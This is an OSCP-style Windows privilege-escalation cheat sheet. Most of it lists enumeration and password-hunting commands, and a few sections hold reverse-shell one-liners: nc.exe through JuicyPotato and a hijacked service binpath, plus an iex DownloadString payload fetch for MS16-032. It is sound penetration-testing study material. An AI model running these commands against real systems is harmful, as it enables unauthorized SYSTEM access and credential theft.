# OSCP Windows Privilege Escalation Cheat Sheet

Created by mr-b4rt0wsk1 on 07/01/2020

Edited with major additions on 06/22/2021

## What to Look For

* Kernel Exploits 
* Service Exploits
    1. Insecure Service Properties
    2. Unquoted Service Path
    3. Weak Registrty Permissions
    4. Insecure Service Executables
    5. DLL Hijacking
* Registry Exploits
    1. AutoRuns
    2. AlwaysInstalledElevated
* Passwords
    1. Registry
    2. Saved Creds
    3. Configuration Files
    4. SAM
    5. Passing the Hash
* Scheduled Tasks 
* Insecure GUI Apps
* Startup Apps
* Installed Apps
* Hot Potato (spoofing attack + NTLM relay attack)
* Token Impersonation (SeImpersonatePrivilege/SeAssignPrimaryToken)
    1. Rotten Potato
    2. Juicy Potato
    3. Rogue Potato
    4. PrintSpoofer
* Port Forwarding

## Enumeration and Privilege Escalation Strategy

1. Manual Enumeration

    ### Basic

    * `whoami` - get current user
    * `whoami /priv` - get current user privileges, useful for checking privs for token impersonation exploits
    * `whoami /all` - list everything there is about a user
    * `hostname` - get current computer name
    * `net users` - get local users on the computer
    * `net user <user>` - get information about a specific user on the computer
    * `net localgroup` - get the list of local groups on the computer
    * `systeminfo` - get OS information, processor information, hotfixes, etc. for current computer

    ### Domain Related

    * `net user /domain <user>` - get information about a specific user on the domain
    * `net group /domain` - get the list of groups on the domain
    * `net group /domain <group>` - get the list of users in a domain group

    ### Networking

    * `ipconfig /all` - get networking information for the current computer
    * `arp -A` - ARP cache table
    * `netstat -ano` - look at TCP/UDP connections and listening ports, as well as what process is associated with them
    * `netsh firewall show state` - only available from XP SP2 and onward, shows the current state of the firewall
    * `netsh firewall show config` - only available from XP SP2 and onward, shows the firewall configuration
    * `route print`

    ### Services and Scheduled Tasks

    * `schtasks /query /fo LIST /v` - list all scheduled tasks the current user is able to see
    * `tasklist /SVC` - shows what services are running and what process is linked to them
    * `net start` - shows what services are started
    * `net start <service>` - start a particular service
    * `DRIVERQUERY` - shows available drivers, which can be nice if a 3rd party driver is installed
    * `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Taskname,TaskPath,State` - (PowerShell), list all scheduled tasks the current user is able to see

    ### More Services (sq and accesschk.exe)

    * `sq qc <service>` - list info on a service, including the binary path, start path, dependencies, and the user it runs as
    * `sq query <service>` - shows the current status of a service (started/stopped)
    * `accesschk.exe /accepteula -uwcqv <user> <service>` - shows permissions to a service for a particular user
    * `accesschk.exe /accepteula -ucqv <service>` - show permissions levels for each user for a particular service, including if they can start/stop it
    * `accesschk.exe /accepteula -uwcqv "Authenticated Users"` - check if there are any Read/Write permissions on services for "Authenticated Users", a low privilege group
    * `accesschk.exe /accepteula -uwdq "C:\Program Files\"` - check the write permissions to a directory
    * `accesschk.exe /accepteula -quvm "C:\Program Files\File Permissions Service\filepermservice.exe"` - check permissions to a service's executable
    * `accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"` - check permissions of the directory for startup apps

    ### Checking the Registry

    * `Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc` - (PowerShell), get the permissions to a particular registry key
    * `accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc` - another way to get the permissions to a particular registry key
    * `reg query HKLM\System\CurrentControlSet\Services\regsvc` - check the current values keys at a certain path in the registry

    ### Checking for AlwaysInstallElevated

    * `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
    * `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

    ### Searching for Passwords

    * Checking the registry
        * `reg query HKLM /f password /t REG_SZ /s`
        * `reg query HKCU /f password /t REG_SZ /s`
    * `cmdkey /list` - checks for any saved creds
    * `dir /s *pass* == *.config` - recursively search for files in the current directory with "pass" in the name or ending in ".config"
    * `findstr /si password *.xml *.ini *.txt` - recursively search for files in the current directory that contain the word "password" with file extension .xml, .ini, .txt
    * SAM locations
        * `C:\Windows\System32\config` - SAM and SYSTEM files are locked when windows are running
        * `C:\Windows\Repair` - possible backup location
        * `C:\Windows\System32\config\RegBack` - another possible backup location

    ### wmic

    * `wmic /?` - check if wmic is available under the current user
    * `wmic qfe get Caption,Description,HotFixID,InstalledOn` - check for hotfixes/patches
    * `wmic service get pathname,startname` - list service binary paths and users they run as
    * `wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """` - check for unquoted service paths
    * see the options for additional info, or this [link](https://www.computerhope.com/wmic.htm) 

2. winPEAS and seatbelt

    ### winPEAS

    * `.\winPEASany.exe quiet servicesinfo` - show useful info for service, registry, and dll hijacking priv esc routes
    * `.\winPEASany.exe quiet applicationsinfo` - show useful info for autorun priv esc routes
    * `.\winPEASany.exe quiet windowscreds` - show useful info for AlwaysInstalledElevated priv esc routes
    * `.\winPEASany.exe quiet filesinfo userinfo` - show useful information for passwords in the registry priv esc routes
    * `.\winPEASany.exe quiet cmd searchfast filesinfo` - show useful info for config files and SAM priv esc routes
    * `.\winPEASany.exe quiet cmd windowscreds` - show useful info for saved creds priv esc routes
    * `.\winPEASany.exe quiet procesinfo` - show non standard process info (note that process is mispelled for some versions)
    * the priv esc routes in the output are explained [here](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)
    * can be uploaded and used as a `.exe` or a `.bat` file
    * `.exe`
        * make sure you are using the correct one for the target's processor (x86 release vs x64 release)
        * an obfuscated release is available for evaiding detection
    * `.bat`
        * for use on systems that do not support the `.exe` (requires NET.4)
        * does not support the colored output

    ### seatbelt

    * `seatbelt.exe NonstandardProcesses` - search for non standard processes (non Microsoft)

3. Look around the C Drive and filesystem

4. Check for internal ports with `netstat`

## Other

### powershell-empire
* Has capabilities for finding kernel exploits (sherlock and MS specific modules)
* Has mimikatz and credential dump from memory capabilites
* Has PowerUp module for running some good priv esc checks
* Basic usage [guide](https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/)

### JuicyPotato.exe
1. Requirements
    * SeImpersonatePrivilege set to "Enabled" for service account/user
    * nc.exe - preferably downloaded to the target machine
    * JuicyPotato.exe - preferably downloaded to the target machine
2. Find a CLSID for the OS version - [handy list](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
3. Execute this to trigger a reverse shell as SYSTEM: `JuicyPotato.exe -t * -p *path to nc.exe* -a "-e cmd.exe 10.10.10.10 4444" -l 9001 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}`
4. If it fails, try a different CLSID (`-c` option) and/or local port (`-l` option).  Also, you may have to put the CLSID in single quotes

### MS16-032
1. `wmic CPU Get NumberOfCores` - check for the number of CPU cores, as 2 or more are required for the exploit
2. If you are able to login with an RDP session, you can use the PowerShell Empire module.  It will pop a new shell, so this isn't feasible if you are working in a reverse shell
3. Copy `/usr/share/powershell-empire/data/module_source/privesc/Invoke-MS16032.ps1` to the current working directory as not to edit the original file
4. Add a line at the end of the file to call the function.  This example will call a reverse shell PowerShell script being served up by the attackers python web server `Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"`

### Kernel Exploits - Compiling Executables for Windows, MS11-046
* `x86_64-w64-mingw32-gcc privesc.c -o privesc64.exe` - this is the regular way to compile 64-bit
* `i686-w64-mingw32-gcc privesc.c -o privesc32.exe` - this is the regular way to compile 32-bit
* `i686-w64-mingw32-gcc privesc.c -o privesc32.exe -lws2_32` - this method was specific to the example EDB #40564 (MS11-046)

### Changing the Binary Path of a Service
1. `sc config *service name* binpath= "C:\nc.exe -nv 10.10.10.10 4444 -e C:\WINDOWS\System32\cmd.exe` - an example of how you can edit the **BINARY PATH NAME**, in this case it will use nc.exe to do a reverse shell
2. `sc config *service name* obj= ".\LocalSystem" password= ""` - example of how to edit the **SERVICE_START_NAME**
3. `net start *service name*` - start the service to trigger the binary.  Remember to set up a listener if trying to catch a reverse shell

### Unquoted Service Paths
1. Find a service using an unquoted service path through manual enumeration or something like PowerUp
    * Example: `C:\Program Files (x86)\Privacyware\Privatefirewall 7.0\pfsvc.exe`
2. Check to see if the user has write privileges to any of the directories that could be used for the exploit.  In the example, there are 2 vulnerable paths
    * `C:\Program.exe` - check for write permissions in the `C:\` directory
    * `C:\Program Files (x86)\Privacyware\Privatefirewall.exe` - check for write premissions in the `C:\Program Files (x86)\Privacyware\` directory
3. Create the malicious binary payload and put it in the appropriate directory
    * msfvenom has a nice exe-service options for generating a payload
4. Start/stop the service as necessary to trigger the binary

## Resources
* Windows Privilege Escalation [gitbook](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
* fuzzy security [tutorial](https://www.fuzzysecurity.com/tutorials/16.html)
* winPEAS [repo](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* PowerShell Empire [repo](https://github.com/EmpireProject/Empire)
* Unquoted Service Paths [guide](https://trustfoundry.net/practical-guide-to-exploiting-the-unquoted-service-path-vulnerability-in-windows/)
* lpeworkshop [repo](https://github.com/sagishahar/lpeworkshop)
* ippsec HTB Jeeves [video](https://www.youtube.com/watch?v=EKGBskG8APc)
* PowerUp dev branch [repo](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc)
* Tib3rius' Windows Privilege Escalation for OSCP & Beyond! [course](https://courses.tib3rius.com/p/windows-privilege-escalation-for-oscp-beyond)